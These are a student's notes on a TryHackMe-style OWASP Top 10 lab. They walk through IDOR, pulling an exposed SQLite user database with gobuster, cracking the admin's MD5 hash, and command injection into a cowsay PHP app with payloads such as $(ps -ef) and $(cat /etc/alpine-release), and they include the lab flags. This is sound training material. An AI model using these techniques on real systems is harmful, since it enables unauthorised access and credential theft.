OWASP TOP 10 


1. Broken Access Control: 

broken access control allows attackers to bypass authorisation, 
allowing them to view sensitive data or perform tasks they aren't supposed to.

Insecure Direct Object Reference

IDOR or Insecure Direct Object Reference refers to an access control 
vulnerability where you can access resources you wouldn't ordinarily be able to see. 
This occurs when the programmer exposes a Direct Object Reference,
 which is just an identifier that refers to specific objects within the server. 
By object, we could mean a file, a user, a bank account in a banking application, or anything really.


For example, let's say we're logging into our bank account, and after correctly authenticating ourselves,
 we get taken to a URL like this https://bank.thm/account?id=111111. On that page, 
we can see all our important bank details, and a user would do whatever they need to do and move along their way, thinking nothing is wrong.


There is, however, a potentially huge problem here, anyone may be able to change the id parameter to something else like 222222, 
and if the site is incorrectly configured, then he would have access to someone else's bank information.

The application exposes a direct object reference through the id parameter in the URL, 
which points to specific accounts. Since the application isn't checking if the logged-in user owns the referenced account, 
an attacker can get sensitive information from other users because of the IDOR vulnerability. 
Notice that direct object references aren't the problem, but rather that the application doesn't validate if the logged-in user should have access to the requested account.

/////////////////////////////////////////

the flag is in http://10.10.247.27/note.php?note_id=0
Avatar
THM Note Server

flag{fivefourthree}


/////////////////////////////////////



2. Cryptographic Failures:

A cryptographic failure refers to any vulnerability arising from the misuse (or lack of use) of cryptographic algorithms for protecting sensitive information. 
Web applications require cryptography to provide confidentiality for their users at many levels. 

Take, for example, a secure email application:

    When you are accessing your email account using your browser, you want to be sure that the communications between you and the server are encrypted. That way, any eavesdropper trying to capture your network packets won't be able to recover the content of your email addresses. When we encrypt the network traffic between the client and server, we usually refer to this as encrypting data in transit.
    Since your emails are stored in some server managed by your provider, it is also desirable that the email provider can't read their client's emails. To this end, your emails might also be encrypted when stored on the servers. This is referred to as encrypting data at rest.

Cryptographic failures often end up in web apps accidentally divulging sensitive data. This is often data directly linked to customers (e.g. names, dates of birth, financial information), but it could also be more technical information, such as usernames and passwords.

At more complex levels, taking advantage of some cryptographic failures often involves techniques such as "Man in The Middle Attacks", whereby the attacker would force user connections through a device they control. Then, they would take advantage of weak encryption on any transmitted data to access the intercepted information (if the data is even encrypted in the first place). Of course, many examples are much simpler, and vulnerabilities can be found in web apps that can be exploited without advanced networking knowledge. Indeed, in some cases, the sensitive data can be found directly on the web server itself.

The web application in this box contains one such vulnerability. To continue, read through the supporting material in the following tasks.


 Task 6
Cryptographic Failures (Supporting Material 1)

The most common way to store a large amount of data in a format easily accessible from many locations is in a database. This is perfect for something like a web application, as many users may interact with the website at any time. Database engines usually follow the Structured Query Language (SQL) syntax.

In a production environment, it is common to see databases set up on dedicated servers running a database service such as MySQL or MariaDB; however, databases can also be stored as files. These are referred to as "flat-file" databases, as they are stored as a single file on the computer. This is much easier than setting up an entire database server and could potentially be seen in smaller web applications. Accessing a database server is outwith the scope of today's task, so let's focus instead on flat-file databases.

As mentioned previously, flat-file databases are stored as a file on the disk of a computer. Usually, this would not be a problem for a web app, but what happens if the database is stored underneath the root directory of the website (i.e. one of the files accessible to the user connecting to the website)? Well, we can download and query it on our own machine, with full access to everything in the database. Sensitive Data Exposure, indeed!

That is a big hint for the challenge, so let's briefly cover some of the syntax we would use to query a flat-file database.

The most common (and simplest) format of a flat-file database is an SQLite database. These can be interacted with in most programming languages and have a dedicated client for querying them on the command line. This client is called sqlite3 and is installed on many Linux distributions by default.

Let's suppose we have successfully managed to download a database:
Linux

user@linux$ ls -l 
-rw-r--r-- 1 user user 8192 Feb  2 20:33 example.db
                                                                                                                                                              
user@linux$ file example.db 
example.db: SQLite 3.x database, last written using SQLite version 3039002, file counter 1, database pages 2, cookie 0x1, schema 4, UTF-8, version-valid-for 1

        

We can see that there is an SQLite database in the current folder.

To access it, we use sqlite3 <database-name>:
Linux

user@linux$ sqlite3 example.db                     
SQLite version 3.39.2 2022-07-21 15:24:47
Enter ".help" for usage hints.
sqlite> 

        

From here, we can see the tables in the database by using the .tables command:
Linux

user@linux$ sqlite3 example.db                     
SQLite version 3.39.2 2022-07-21 15:24:47
Enter ".help" for usage hints.
sqlite> .tables
customers

        

At this point, we can dump all the data from the table, but we won't necessarily know what each column means unless we look at the table information. First, let's use PRAGMA table_info(customers); to see the table information. Then we'll use SELECT * FROM customers; to dump the information from the table:
Linux

sqlite> PRAGMA table_info(customers);
0|cudtID|INT|1||1
1|custName|TEXT|1||0
2|creditCard|TEXT|0||0
3|password|TEXT|1||0

sqlite> SELECT * FROM customers;
0|Joy Paulson|4916 9012 2231 7905|5f4dcc3b5aa765d61d8327deb882cf99
1|John Walters|4671 5376 3366 8125|fef08f333cc53594c8097eba1f35726a
2|Lena Abdul|4353 4722 6349 6685|b55ab2470f160c331a99b8d8a1946b19
3|Andrew Miller|4059 8824 0198 5596|bc7b657bd56e4386e3397ca86e378f70
4|Keith Wayman|4972 1604 3381 8885|12e7a36c0710571b3d827992f4cfe679
5|Annett Scholz|5400 1617 6508 1166|e2795fc96af3f4d6288906a90a52a47f

        

We can see from the table information that there are four columns: custID, custName, creditCard and password. You may notice that this matches up with the results. Take the first row:

0|Joy Paulson|4916 9012 2231 7905|5f4dcc3b5aa765d61d8327deb882cf99
 

We have the custID (0), the custName (Joy Paulson), the creditCard (4916 9012 2231 7905) and a password hash (5f4dcc3b5aa765d61d8327deb882cf99).

In the next task, we'll look at cracking this hash.

 
Cryptographic Failures (Supporting Material 2)


We saw how to query an SQLite database for sensitive data in the previous task. We found a collection of password hashes, one for each user. In this task, we will briefly cover how to crack these.

When it comes to hash cracking, Kali comes pre-installed with various tools. If you know how to use these, then feel free to do so; however, they are outwith the scope of this material.

Instead, we will be using the online tool: Crackstation. This website is extremely good at cracking weak password hashes. For more complicated hashes, we would need more sophisticated tools; however, all of the crackable password hashes used in today's challenge are weak MD5 hashes, which Crackstation should handle very nicely.

When we navigate to the website, we are met with the following interface:

Crackstation

Let's try pasting the password hash for Joy Paulson, which we found in the previous task (5f4dcc3b5aa765d61d8327deb882cf99). We solve the Captcha, then click the "Crack Hashes" button:

Cracked Password

We see that the hash was successfully broken, and the user's password was "password". How secure!

It's worth noting that Crackstation works using a massive wordlist. If the password is not in the wordlist, then Crackstation will not be able to break the hash.

The challenge is guided, so if Crackstation fails to break a hash in today's box, you can assume that the hash has been specifically designed not to be crackable.




Cryptographic Failures (Challenge):


///////////////////////////


using gobuster  gobuster dir -u http://10.10.247.27:81/  -w /usr/share/seclists/Discovery/Web-Content/common.txt 

ull find this repo : http://10.10.247.27:81/assets/

download the webapp.db file : file ~/Downloads/webapp.db         
/home/Abad/Downloads/webapp.db: SQLite 3.x database, last written using SQLite version 3022000, file counter 255, database pages 7, 1st free page 5, free pages 1, cookie 0x6, schema 4, UTF-8, version-valid-for 255


thos are some of the db info 


///////////////////////////////


 sqlite3 ~/Downloads/webapp.db
SQLite version 3.49.1 2025-02-18 13:38:58
Enter ".help" for usage hints.
sqlite> .tables
sessions  users   
sqlite> PRAGMA table_info(users);
0|userID|TEXT|1||1
1|username|TEXT|1||0
2|password|TEXT|1||0
3|admin|INT|1||0
sqlite> select * from users;
4413096d9c933359b898b6202288a650|admin|6eea9b7ef19179a06954edd0f6c05ceb|1
23023b67a32488588db1e28579ced7ec|Bob|ad0234829205b9033196ba818f7a872b|1
4e8423b514eef575394ff78caed3254d|Alice|268b38ca7b84f44fa0a6cdc86e6301e0|0
sqlite> 

//////////////////////////////////


lets try to find the password hash of the admin user? 

we cracked the password Hash	Type	Result
6eea9b7ef19179a06954edd0f6c05ceb	md5	qwertyuiop


using the website crackstation 

now lets log in as the admin user 

this is the flag 

/////////////////////


Welcome, admin

Well done.
Your flag is: THM{Yzc2YjdkMjE5N2VjMzNhOTE3NjdiMjdl}



////////////////////////




3. Injection 

Injection flaws are very common in applications today. These flaws occur because the application interprets user-controlled input as commands or parameters. Injection attacks depend on what technologies are used and how these technologies interpret the input. Some common examples include:

    SQL Injection: This occurs when user-controlled input is passed to SQL queries. As a result, an attacker can pass in SQL queries to manipulate the outcome of such queries. This could potentially allow the attacker to access, modify and delete information in a database when this input is passed into database queries. This would mean an attacker could steal sensitive information such as personal details and credentials.
    Command Injection: This occurs when user input is passed to system commands. As a result, an attacker can execute arbitrary system commands on application servers, potentially allowing them to access users' systems.

The main defence for preventing injection attacks is ensuring that user-controlled input is not interpreted as queries or commands. There are different ways of doing this:

    Using an allow list: when input is sent to the server, this input is compared to a list of safe inputs or characters. If the input is marked as safe, then it is processed. Otherwise, it is rejected, and the application throws an error.
    Stripping input: If the input contains dangerous characters, these are removed before processing.

Dangerous characters or input is classified as any input that can change how the underlying data is processed. Instead of manually constructing allow lists or stripping input, various libraries exist that can perform these actions for you.



Command Injection

Command Injection occurs when server-side code (like PHP) in a web application makes a call to a function that interacts with the server's console directly. An injection web vulnerability allows an attacker to take advantage of that call to execute operating system commands arbitrarily on the server. The possibilities for the attacker from here are endless: they could list files, read their contents, run some basic commands to do some recon on the server or whatever they wanted, just as if they were sitting in front of the server and issuing commands directly into the command line. 

Once the attacker has a foothold on the web server, they can start the usual enumeration of your systems and look for ways to pivot around.

Code Example

Let's consider a scenario: MooCorp has started developing a web-based application for cow ASCII art with customisable text. While searching for ways to implement their app, they've come across the cowsay command in Linux, which does just that! Instead of coding a whole web application and the logic required to make cows talk in ASCII, they decide to write some simple code that calls the cowsay command from the operating system's console and sends back its contents to the website.

Let's look at the code they used for their app.  See if you can determine why their implementation is vulnerable to command injection.  We'll go over it below.

<?php
    if (isset($_GET["mooing"])) {
        $mooing = $_GET["mooing"];
        $cow = 'default';

        if(isset($_GET["cow"]))
            $cow = $_GET["cow"];
        
        passthru("perl /usr/bin/cowsay -f $cow $mooing");
    }
?>

In simple terms, the above snippet does the following:

    Checking if the parameter "mooing" is set. If it is, the variable $mooing gets what was passed into the input field.
    Checking if the parameter "cow" is set. If it is, the variable $cow gets what was passed through the parameter.
    The program then executes the function passthru("perl /usr/bin/cowsay -f $cow $mooing");. The passthru function simply executes a command in the operating system's console and sends the output back to the user's browser. You can see that our command is formed by concatenating the $cow and $mooing variables at the end of it. Since we can manipulate those variables, we can try injecting additional commands by using simple tricks. If you want to, you can read the docs on passthru() on PHP's website for more information on the function itself.



 Exploiting Command Injection

Now that we know how the application works behind the curtains, we will take advantage of a bash feature called "inline commands" to abuse the cowsay server and execute any arbitrary command we want. Bash allows you to run commands within commands. This is useful for many reasons, but in our case, it will be used to inject a command within the cowsay server to get it executed.

To execute inline commands, you only need to enclose them in the following format $(your_command_here). If the console detects an inline command, it will execute it first and then use the result as the parameter for the outer command. Look at the following example, which runs whoami as an inline command inside an echo command:

Inline commands

So coming back to the cowsay server, here's what would happen if we send an inline command to the web application:

Sending our payload

Since the application accepts any input from us, we can inject an inline command which will get executed and used as a parameter for cowsay. This will make our cow say whatever the command returns! In case you are not that familiar with Linux, here are some other commands you may want to try:

    whoami
    id
    ifconfig/ip addr
    uname -a
    ps -ef

To complete the questions below, navigate to http://10.10.247.27:82/ and exploit the cowsay server. 


this is an exemple of cmnd injection output 

//////////////////////////////////////

Cowsay Online
Choose your cow:

 _______________________________ 
< css drpepper.txt index.php js >
 ------------------------------- 
        \   ^__^
         \  (oo)\_______
            (__)\       )\/\
                ||----w |
                ||     ||
                    


////////////////////////////////


the strange file in the root directory is drpepper.txt 


by injecting this cmnd : $(ps -ef)

////////////////////////////////

PID USER TIME COMMAND 1 root 0:00       \
| {docker-entrypoi} /bin/sh               |
| /docker-entrypoint.sh 25 root 0:00      |
| httpd -D FOREGROUND 26 apache 0:00      |
| httpd -D FOREGROUND 27 apache 0:00      |
| httpd -D FOREGROUND 28 apache 0:00      |
| httpd -D FOREGROUND 29 apache 0:00      |
| httpd -D FOREGROUND 30 apache 0:00      |
| httpd -D FOREGROUND 1599 apache 0:00    |
| httpd -D FOREGROUND 1600 apache 0:00    |
| httpd -D FOREGROUND 1601 apache 0:00    |
| httpd -D FOREGROUND 1768 apache 0:00 sh |
| -c perl /usr/bin/cowsay -f default $(ps |
\ -ef) 1769 apache 0:00 ps -ef  

///////////////////////////////////


we found that no non-root/non-service/non-daemon users are there : 0;

by injecting the cmnd : $(whoami)

we can access  user that this app running as


///////////////////////////////////

 ________ 
< apache >
 -------- 
        \   ^__^
         \  (oo)\_______
            (__)\       )\/\
                ||----w |
                ||     ||
                    

///////////////////////////////


lets uss this cmnd $(getent passwd apache) : The command $(getent passwd apache) runs the getent command to query the system's user database (passwd file) for the user entry associated with the username apache. 
by using this cmnd we can see this : apache:x:100:101:apache:/var/www:/sbin/ \
\ nologin    

we now know what is the user's shell set as :  sbin/nologin


to know the  version of Alpine Linux is running
 we use : $(cat /etc/alpine-release)
< 3.16.0 >



4. Insecure Design: 



 

 

